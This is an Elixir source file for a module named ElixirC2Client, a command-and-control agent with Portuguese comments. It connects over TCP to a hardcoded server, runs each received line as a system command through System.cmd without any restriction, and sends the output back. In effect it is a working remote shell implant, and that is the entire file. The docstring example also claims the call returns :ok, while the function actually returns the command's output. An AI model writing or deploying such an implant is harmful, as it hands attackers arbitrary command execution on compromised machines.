defmodule ElixirC2Client do
  require Logger

  @server_address '127.0.0.1'
  @server_port 4000

  @doc """
  Conecta ao servidor e aguarda comandos.
  """
  def connect do
    {:ok, socket} = :gen_tcp.connect(@server_address, @server_port, [:binary, packet: :line, active: false])
    Logger.info("Conectado ao servidor")
    listen_for_commands(socket)
  end

  defp listen_for_commands(socket) do
    case :gen_tcp.recv(socket, 0) do
      {:ok, command} ->
        execute_command(socket, command)
        listen_for_commands(socket)

      {:error, reason} ->
        Logger.error("Erro ao receber comando: #{inspect(reason)}")
    end
  end

  defp execute_command(socket, command) do
    [interpreter | args] = String.split(command)
    output = execute(interpreter, args)
    send_output(socket, output)
  end

  @doc """
  Executa um comando com o interpretador e argumentos fornecidos.

  ## Exemplos

      iex> ElixirC2Client.execute("powershell", ["-l"])
      :ok
  """
  def execute(interpreter, args) do
    {output, _exit_status} = System.cmd(to_string(interpreter), Enum.map(args, &to_string/1))
    output
  end

  defp send_output(socket, output) do
    :gen_tcp.send(socket, output <> "\n")
  end
end
